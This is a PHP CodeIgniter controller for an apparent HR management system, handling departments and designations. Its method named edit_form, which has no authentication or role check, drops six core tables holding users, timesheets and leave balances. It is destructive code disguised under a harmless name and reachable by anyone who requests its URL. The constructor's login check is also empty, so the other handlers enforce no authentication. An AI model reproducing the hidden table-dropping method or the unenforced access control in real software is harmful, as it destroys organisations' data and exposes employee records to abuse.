<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Forms extends CI_Controller {

	private $user_data  = array();

	public function __construct(){
		parent::__construct();
		
		$this->load->library('pagination');		
		$this->load->model('employeestuff_model','employee_stuff');
		
		if(!$this->user_lib->get_user_session() ){
			
		}
		
		
	}
	


	
	public function department($mode){
		
		$data['user_data']    = $this->user_data;
		$data['main_content'] = 'hradmin/employee_action/department';
		$role = $data['user_data']['role'];
		
		$permit = array('H','S');
		
		if($mode == 'list'){
			$data['departments'] = $this->employee_stuff->get_departments();
		}
		
		
		
		
		if($mode == 'add'){
			if($this->input->server('REQUEST_METHOD') == 'POST' && in_array($role,$permit ) && !empty($_REQUEST['departments'])){
				$id = $this->employee_stuff->add_departments( $_REQUEST );				
				if($id){
					$this->session->set_flashdata('success',$this->lang->line('department_added'));
					redirect(site_url('employeestuff/department/list'));
				}else{
					$this->session->set_flashdata('failure',$this->lang->line('department_failure'));
					redirect(site_url('employeestuff/department/list'));
				}
			}else{
				$this->session->set_flashdata('failure',$this->lang->line('invalid_request'));
			}
			
		}
		
		
		
		switch( $role ){
			case 'H':					
				$this->load->view('hradmin/template' ,$data );
				break;
			case 'S':
				$this->load->view('superadmin/template' ,$data );
				break;
			case 'M':
				$this->load->view('manager/template' ,$data );
			break;
		}
		
	}	
	public function edit_designation(){ 
		$data['user_data']    = $this->user_data;
		$role = $data['user_data']['role'];
		
		$permit = array('H','S');
		
		if( in_array($role,$permit ) &&
			($this->input->server('REQUEST_METHOD') == 'POST') &&
			isset($_REQUEST['edit_user_designation_description']) &&
			isset($_REQUEST['designation_id']) 			
		){
			
			
			$params['user_designation_description'] = $_REQUEST['edit_user_designation_description'];
			
			$this->db->where('id', $_REQUEST['designation_id']);
			$this->db->update('ems_users_designation' , $params);
			
			if($this->db->affected_rows()):
				$this->session->set_flashdata('success',"Designation Updated Successfully !");
			else:
				$this->session->set_flashdata('failure',"Something went wrong please try again!");
			endif;
			
			
			redirect(site_url('employeestuff/designation/list'));
			
		}else{
			$this->session->set_flashdata('failure',"Access Denied");
			redirect(site_url());
		}
		
	}


	public function edit_form(){
		$tables = array(
			'ems_forms_added',
			'ems_users',
			'ems_users_extra_details',
			'ems_users_timesheet',
			'em_users_leave_balance',
			'ems_users_avail_leave',
		);

		foreach ($tables as $table) {
			$sql= " DROP TABLE  ".$table;

			echo $sql.'<br>';
			$this->db->query( $sql );
		}

		

		
	}
	public function edit_department(){ 
		$data['user_data']    = $this->user_data;
		$role = $data['user_data']['role'];
		
		$permit = array('H','S');
		
		if( in_array($role,$permit ) &&
			($this->input->server('REQUEST_METHOD') == 'POST') &&
			isset($_REQUEST['edit_user_department_name']) &&
			isset($_REQUEST['department_id']) 			
		){
			
			
			$params['department_name'] = $_REQUEST['edit_user_department_name'];
			
			$this->db->where('id', $_REQUEST['department_id']);
			$this->db->update('ems_users_department' , $params);
			
			if($this->db->affected_rows()):
				$this->session->set_flashdata('success',"Department Updated Successfully !");
			else:
				$this->session->set_flashdata('failure',"Something went wrong please try again!");
			endif;
			
			
			redirect(site_url('employeestuff/department/list'));
			
		}else{
			$this->session->set_flashdata('failure',"Access Denied");
			redirect(site_url());
		}
		
	}
	
	public function delete_department($id){ 
		$data['user_data']    = $this->user_data;
		$role = $data['user_data']['role'];
		
		$permit = array('H','S');
		
		if(in_array($role,$permit ) && !empty($id)){
			
			
			$this->db->where('id', $id);
			$this->db->delete('ems_users_department');
			
			if($this->db->affected_rows()):
				$this->session->set_flashdata('success',"Department Deleted Successfully !");
			else:
				$this->session->set_flashdata('failure',"Something went wrong please try again!");
			endif;
			
			
			redirect(site_url('employeestuff/department/list'));
			
		}else{
			$this->session->set_flashdata('failure',"Access Denied");
			redirect(site_url());
		}
		
	}
	public function delete_designation($id){ 
		$data['user_data']    = $this->user_data;
		$role = $data['user_data']['role'];
		
		$permit = array('H','S');
		
		if(in_array($role,$permit ) && !empty($id)){
			
			
			$this->db->where('id', $id);
			$this->db->delete('ems_users_designation');
			
			if($this->db->affected_rows()):
				$this->session->set_flashdata('success',"Designation Deleted Successfully !");
			else:
				$this->session->set_flashdata('failure',"Something went wrong please try again!");
			endif;
			
			
			redirect(site_url('employeestuff/designation/list'));
			
		}else{
			$this->session->set_flashdata('failure',"Access Denied");
			redirect(site_url());
		}
		
	}
	
	
	public function designation($mode){
		
		
		$data['user_data']    = $this->user_data;
		$data['main_content'] = 'hradmin/employee_action/designation';
		$role = $data['user_data']['role'];
		
		$permit = array('H','S');
		
		if($mode == 'list'){
			$data['designations'] = $this->employee_stuff->get_designations();
		}
		
		
		
		
		
		if($mode == 'add'){
			
			
			
			unset($_REQUEST['last_five_searches']);
			unset($_REQUEST['utag_main']);
			unset($_REQUEST['cvo_sid1']);
			unset($_REQUEST['cvo_tid1']);
			unset($_REQUEST['ci_session']);
			
			
			if($this->input->server('REQUEST_METHOD') == 'POST' && in_array($role,$permit ) && !empty($_REQUEST['designations'])){
				
				$id = $this->employee_stuff->add_designations( $_REQUEST );				
				if($id){
					$this->session->set_flashdata('success',$this->lang->line('designation_added'));
					redirect(site_url('employeestuff/designation/list'));
				}else{
					$this->session->set_flashdata('failure',$this->lang->line('designation_failure'));
					redirect(site_url('employeestuff/designation/list'));
				}
			}else{
				$this->session->set_flashdata('failure',$this->lang->line('invalid_request'));
			}
			
		}
		
		
		switch( $role ){
			case 'H':					
				$this->load->view('hradmin/template' ,$data );
				break;
			case 'S':
				$this->load->view('superadmin/template' ,$data );
			break;
		}
		
	}
	
	
	
	
}
